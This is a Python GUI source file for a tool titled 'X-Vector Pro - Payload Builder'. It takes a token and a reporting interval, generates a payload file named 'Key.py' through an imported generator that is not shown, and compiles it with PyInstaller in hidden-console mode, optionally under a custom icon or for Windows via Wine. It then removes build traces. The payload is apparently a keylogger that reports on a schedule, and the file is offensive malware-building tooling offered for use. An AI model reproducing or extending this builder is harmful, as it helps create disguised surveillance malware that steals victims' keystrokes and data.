import customtkinter as ctk
import os
from subprocess import call
from datetime import datetime
from cryptography.fernet import Fernet
from Utils.generator import build_t


# Set appearance mode and theme
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")


class XVectorGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("X-Vector Pro - Payload Builder")
        self.geometry("720x500")
        self.icon_path = None

        # Inputs
        self.token_entry = ctk.CTkEntry(self, placeholder_text="Enter Token")
        self.token_entry.pack(pady=10)

        self.interval_entry = ctk.CTkEntry(self, placeholder_text="Enter Time Interval (minutes)")
        self.interval_entry.pack(pady=10)

        # Buttons
        ctk.CTkButton(self, text="Generate Payload", command=self.generate_payload).pack(pady=5)
        ctk.CTkButton(self, text="Compile for Windows", command=self.compile_windows).pack(pady=5)
        ctk.CTkButton(self, text="Compile with Icon", command=self.compile_with_icon).pack(pady=5)
        ctk.CTkButton(self, text="Compile for Linux (Wine)", command=self.compile_linux).pack(pady=5)
        ctk.CTkButton(self, text="Encrypt Log", command=self.encrypt_log).pack(pady=5)

        # Log output
        self.log_box = ctk.CTkTextbox(self, width=680, height=200)
        self.log_box.pack(pady=10)

    def log(self, msg: str) -> None:
        """Logs a message with a timestamp to the log box."""
        timestamp = f"[{datetime.now()}]"
        self.log_box.insert("end", f"{timestamp} {msg}\n")
        self.log_box.see("end")

    def generate_payload(self) -> None:
        """Generates a payload using the provided token and interval."""
        token = self.token_entry.get().strip()
        interval = self.interval_entry.get().strip()
        if not token or not interval:
            self.log("Error: Token and interval are required.")
            return
        try:
            build_t(token, interval)
            self.log("Success: Payload generated as 'Key.py'.")
        except Exception as e:
            self.log(f"Error generating payload: {e}")

    def compile_windows(self) -> None:
        """Compiles the payload for Windows."""
        self._compile_cmd("pyinstaller --onefile --noconsole Key.py", clear="cls")

    def compile_with_icon(self) -> None:
        """Compiles the payload for Windows with a custom icon."""
        from tkinter import filedialog
        self.icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
        if self.icon_path:
            cmd = f"pyinstaller --onefile --noconsole --icon={self.icon_path} Key.py"
            self._compile_cmd(cmd, clear="cls")

    def compile_linux(self) -> None:
        """Compiles the payload for Linux using Wine."""
        pyinstaller_path = os.path.expanduser("~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe")
        cmd = ["wine", pyinstaller_path, "--onefile", "--noconsole", "Key.py"]
        try:
            call(cmd)
            self.log("Success: Linux payload compiled with Wine.")
            self.cleanup()
        except Exception as e:
            self.log(f"Error: Linux compile failed: {e}")

    def encrypt_log(self) -> None:
        """Encrypts the log file."""
        log_file_path = "xvector_log.txt"
        encrypted_log_path = "xvector_encrypted.log"
        try:
            with open(log_file_path, "r") as f:
                data = f.read()
            key = Fernet.generate_key()
            cipher = Fernet(key)
            encrypted_data = cipher.encrypt(data.encode())
            with open(encrypted_log_path, "wb") as f:
                f.write(encrypted_data)
            self.log(f"Success: Log encrypted to '{encrypted_log_path}'.")
        except Exception as e:
            self.log(f"Error: Encryption failed: {e}")

    def _compile_cmd(self, cmd: str, clear: str = None) -> None:
        """Runs a compilation command and handles cleanup."""
        try:
            os.system(cmd)
            self.cleanup()
            if clear:
                os.system(clear)
            self.log("Success: Compilation completed.")
        except Exception as e:
            self.log(f"Error: Compilation failed: {e}")

    def cleanup(self) -> None:
        """Cleans up temporary files created during compilation."""
        temp_files = ["Key.py", "Key.spec"]
        temp_dirs = ["__pycache__", "build"]
        for file in temp_files:
            try:
                os.remove(file)
            except FileNotFoundError:
                pass
        for directory in temp_dirs:
            try:
                import shutil
                shutil.rmtree(directory, ignore_errors=True)
            except Exception:
                pass


if __name__ == "__main__":
    app = XVectorGUI()
    app.mainloop()
